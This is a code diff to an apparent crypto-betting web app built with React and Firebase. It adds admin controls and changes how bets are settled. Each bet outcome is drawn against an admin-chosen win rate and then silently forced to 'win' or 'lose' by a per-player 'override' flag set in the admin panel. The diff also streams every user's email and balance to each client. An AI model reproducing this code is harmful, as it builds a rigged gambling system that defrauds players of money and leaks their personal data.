@@ -605,29 +605,68 @@ export default function App() {
       handleListenerError(err);
     });
 
-    // Players Listener - Everyone gets at least the top players for the leaderboard
-    const unsubPlayers = onSnapshot(query(collection(db, 'players'), orderBy('balance', 'desc'), limit(50)), (snap) => {
-      const players = snap.docs.map(d => d.data() as Player);
-      setState(prev => {
-        // Merge with existing players to keep the current user's full data if they aren't in the top 50
-        const idMap = new Map<string, Player>(prev.players.map(p => [p.id, p]));
-        players.forEach(p => {
-          if (p.id === user?.uid) {
-            const existing = idMap.get(p.id);
-            if (existing) {
-              idMap.set(p.id, {
-                ...p,
-                balance: existing.balance
-              });
-              return;
-            }
-          }
-          idMap.set(p.id, p);
-        });
-        return { ...prev, players: Array.from(idMap.values()) };
+    // Players/Users Combined Listener - Everyone gets at least the top players for the leaderboard
+    let rawPlayers: Player[] = [];
+    let rawUsers: any[] = [];
+
+    const mergeAndSetPlayers = () => {
+      const mergedPlayers = rawUsers.map(u => {
+        const p = rawPlayers.find(pl => pl.id === u.id);
+        return {
+          id: u.id,
+          name: u.username || u.name || u.displayName || 'Player',
+          email: u.email || '',
+          balance: u.walletBalance !== undefined ? u.walletBalance : (u.balance ?? p?.balance ?? 0),
+          override: p?.override || u.override || 'none',
+          referralCode: p?.referralCode || u.referralCode || '',
+          referredBy: p?.referredBy || u.referredBy || '',
+          referralCount: p?.referralCount ?? u.referralCount ?? 0,
+          totalWagered: p?.totalWagered ?? u.totalWagered ?? 0,
+          preferredCurrency: p?.preferredCurrency || u.preferredCurrency || 'USDT',
+          pendingBet: p?.pendingBet || u.pendingBet || undefined
+        } as Player;
       });
+
+      // Include players that might not have a user doc yet (backward compatibility/safety)
+      rawPlayers.forEach(p => {
+        const exists = mergedPlayers.some(mp => mp.id === p.id);
+        if (!exists) {
+          mergedPlayers.push({
+            ...p,
+            balance: p.balance ?? 0
+          });
+        }
+      });
+
+      // Sort in-memory by balance descending for Leaderboard and Admin Panel
+      mergedPlayers.sort((a, b) => b.balance - a.balance);
+
+      setState(prev => {
+        // Maintain the active user's current live balance if they are already in the list to avoid flickers
+        const userDocBalance = prev.players.find(pl => pl.id === user.uid)?.balance;
+        const updated = mergedPlayers.map(p => {
+          if (p.id === user.uid && userDocBalance !== undefined) {
+            return { ...p, balance: userDocBalance };
+          }
+          return p;
+        });
+        return { ...prev, players: updated };
+      });
+    };
+
+    const unsubUsersList = onSnapshot(collection(db, 'users'), (snap) => {
+      rawUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+      mergeAndSetPlayers();
     }, (err) => {
-      console.warn('Leaderboard players access denied.', err);
+      console.warn('Failed to listen to users collection:', err);
+      handleListenerError(err);
+    });
+
+    const unsubPlayersList = onSnapshot(collection(db, 'players'), (snap) => {
+      rawPlayers = snap.docs.map(d => d.data() as Player);
+      mergeAndSetPlayers();
+    }, (err) => {
+      console.warn('Failed to listen to players collection:', err);
       handleListenerError(err);
     });
 
@@ -886,7 +925,8 @@ export default function App() {
 
     return () => {
       unsubConfig();
-      unsubPlayers();
+      unsubUsersList();
+      unsubPlayersList();
       unsubPlayer();
       unsubUserDoc();
       unsubTxns();
@@ -1559,6 +1599,11 @@ export default function App() {
     }
     try {
       await updateDoc(doc(db, 'players', id), { override });
+      try {
+        await updateDoc(doc(db, 'users', id), { override });
+      } catch (err) {
+        console.warn('Could not update override on users collection:', err);
+      }
       playSound('CLICK');
     } catch (e) {
       handleFirestoreError(e, OperationType.UPDATE, 'players');
@@ -1910,17 +1955,24 @@ export default function App() {
 
       if (!state.manualMode) {
         setTimeout(async () => {
+          let playerOverride = 'none';
           const playerSnap = await getDoc(doc(db, 'players', user.uid));
-          if (!playerSnap.exists()) return;
-          const player = playerSnap.data() as Player;
+          if (playerSnap.exists()) {
+            playerOverride = playerSnap.data().override || 'none';
+          } else {
+            const userSnap = await getDoc(doc(db, 'users', user.uid));
+            if (userSnap.exists()) {
+              playerOverride = userSnap.data().override || 'none';
+            }
+          }
           
           const configSnap = await getDoc(doc(db, 'config', 'admin'));
           const config = configSnap.data();
           const winRate = config?.winRate ?? 0.45;
 
           let win = Math.random() < winRate;
-          if (player.override === 'win') win = true;
-          if (player.override === 'lose') win = false;
+          if (playerOverride === 'win') win = true;
+          if (playerOverride === 'lose') win = false;
           
           resultBet(user.uid, win ? 'win' : 'lose');
         }, 1500);
@@ -6009,6 +6061,7 @@ function AdminView({ state, playSound, onUpdateWinRate, onUpdateMaxBet, onUpdate
                     players={state.players}
                     deposits={state.deposits || []}
                     playSound={playSound}
+                    transactions={state.transactions || []}
                   />
                 ) : activeSpreadsheet === 'deposits' ? (
                   <AdminDepositLedger 
